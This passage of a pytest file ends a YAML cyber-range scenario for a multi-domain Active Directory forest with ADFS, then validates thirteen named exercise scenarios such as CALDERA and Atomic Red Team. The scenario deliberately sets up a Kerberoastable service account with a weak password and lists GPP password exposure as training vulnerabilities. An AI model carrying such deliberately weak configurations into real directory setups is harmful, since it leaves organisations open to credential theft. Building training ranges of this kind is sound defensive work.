    resources: {ram: 4 gib, cpu: 2}
    features: {ad-forest-root: admin}
    roles: {admin: Administrator}
  dc02:
    type: VM
    os: windows
    os_version: "Server 2022"
    resources: {ram: 4 gib, cpu: 2}
    features: {ad-child-domain: admin}
    roles: {admin: Administrator}
  adfs:
    type: VM
    os: windows
    resources: {ram: 2 gib, cpu: 1}
    features: {adfs-service: admin}
    roles: {admin: Administrator}
  ws01:
    type: VM
    os: windows
    resources: {ram: 4 gib, cpu: 2}

infrastructure:
  corp-net: {count: 1, properties: {cidr: 10.0.0.0/16, gateway: 10.0.0.1, internal: true}}
  dmz-net: {count: 1, properties: {cidr: 172.16.0.0/24, gateway: 172.16.0.1}}
  dc01: {count: 1, links: [corp-net]}
  dc02: {count: 1, links: [corp-net], dependencies: [dc01]}
  adfs: {count: 1, links: [corp-net, dmz-net], dependencies: [dc01]}
  ws01: {count: 1, links: [corp-net]}

features:
  ad-forest-root:
    type: Service
    source: adds-forest
    description: "AD DS forest root domain"
  ad-child-domain:
    type: Service
    source: adds-child
    dependencies: [ad-forest-root]
    description: "AD DS child domain"
  adfs-service:
    type: Service
    source: adfs-2019
    dependencies: [ad-forest-root]
    description: "AD Federation Services for SSO"

accounts:
  domain-admin:
    username: Administrator
    node: dc01
    groups: [Domain Admins, Enterprise Admins]
    password_strength: strong
  svc-sql:
    username: svc_mssql
    node: dc01
    groups: [Domain Users]
    password_strength: weak
    spn: "MSSQL/db.corp.local"
    description: "Kerberoastable service account"
  child-admin:
    username: Administrator
    node: dc02
    groups: [Domain Admins]
    password_strength: strong
  employee:
    username: jdoe
    node: ws01
    groups: [Domain Users]
    password_strength: medium
    mail: "jdoe@corp.local"

relationships:
  child-trusts-parent:
    type: trusts
    source: ad-child-domain
    target: ad-forest-root
    description: "Child domain trusts forest root (automatic)"
    properties:
      trust_type: parent-child
      trust_direction: bidirectional

  adfs-authenticates-via-ad:
    type: authenticates_with
    source: adfs-service
    target: ad-forest-root
    description: "ADFS authenticates users against AD"

  adfs-federates-cloud:
    type: federates_with
    source: adfs-service
    target: adfs-service
    description: "ADFS provides SAML federation to cloud apps"
    properties:
      protocol: SAML
      idp_type: on-premises

vulnerabilities:
  kerberoast:
    name: Kerberoastable SPN
    description: "Service account with weak password and SPN"
    technical: true
    class: CWE-916
  gpp-passwords:
    name: GPP Passwords
    description: "Credentials in Group Policy Preferences"
    technical: true
    class: CWE-312

entities:
  red-team: {name: Red Team, role: Red}
  blue-team: {name: Blue Team, role: Blue}
"""


SCENARIOS = [
    ("1. OCR Full Exercise (14 sections)",       OCR_FULL_EXERCISE),
    ("2. CybORG CAGE-1 (3-host, Metasploit)",   CYBORG_CAGE1),
    ("3. CybORG CAGE-2 (13-host enterprise+OT)", CYBORG_CAGE2),
    ("4. CALDERA Ransack (multi-step attack)",   CALDERA_RANSACK),
    ("5. Atomic Red Team (credential dumping)",  ATOMIC_CRED_DUMP),
    ("6. CyRIS DMZ (firewall + web + db)",       CYRIS_DMZ),
    ("7. KYPO CTF (training + scoring)",         KYPO_CTF),
    ("8. HTB Machine (single-box challenge)",    HTB_MACHINE),
    ("9. Enterprise AD (multi-domain forest)",   ENTERPRISE_AD),
    ("10. Cloud Hybrid (AWS VPC + on-prem VPN)", CLOUD_HYBRID),
    ("11. Exchange with data+accounts+ACLs",     EXCHANGE_WITH_DATA),
    ("12. CybORG CAGE-2 with agents",           CYBORG_WITH_AGENTS),
    ("13. Multi-domain AD with trust+federation", AD_TRUST_FEDERATED),
]


@pytest.mark.parametrize("label,yaml_str", SCENARIOS, ids=[s[0] for s in SCENARIOS])
def test_scenario_parses_and_validates(label, yaml_str):
    """Each real-world scenario must parse and pass semantic validation."""
    scenario, error = _parse(yaml_str, label)
    assert error is None, f"{label} failed: {error}"
    assert scenario is not None

    # Verify the scenario has meaningful content
    has_nodes = bool(scenario.nodes)
    has_features = bool(scenario.features)
    has_steps = bool(scenario.steps)
    has_objectives = bool(scenario.objectives.red or scenario.objectives.blue)
    has_stories = bool(scenario.stories)
    has_entities = bool(scenario.entities)
    assert any([has_nodes, has_features, has_steps, has_objectives, has_stories]), \
        f"{label} parsed but has no content"


@pytest.mark.parametrize("label,yaml_str", SCENARIOS, ids=[s[0] for s in SCENARIOS])
def test_scenario_topology_integrity(label, yaml_str):
    """Infrastructure references and node cross-references are consistent."""
    scenario = parse_sdl(textwrap.dedent(yaml_str))

    # Every infra entry should match a node
    for name in scenario.infrastructure:
        assert name in scenario.nodes, \
            f"{label}: infra '{name}' has no matching node"

    # Every VM feature reference should exist in features
    for node_name, node in scenario.nodes.items():
        for feat_name in node.features:
            assert feat_name in scenario.features, \
                f"{label}: node '{node_name}' refs missing feature '{feat_name}'"

    # Every vulnerability reference should exist
    for node_name, node in scenario.nodes.items():
        for vuln_name in node.vulnerabilities:
            assert vuln_name in scenario.vulnerabilities, \
                f"{label}: node '{node_name}' refs missing vuln '{vuln_name}'"
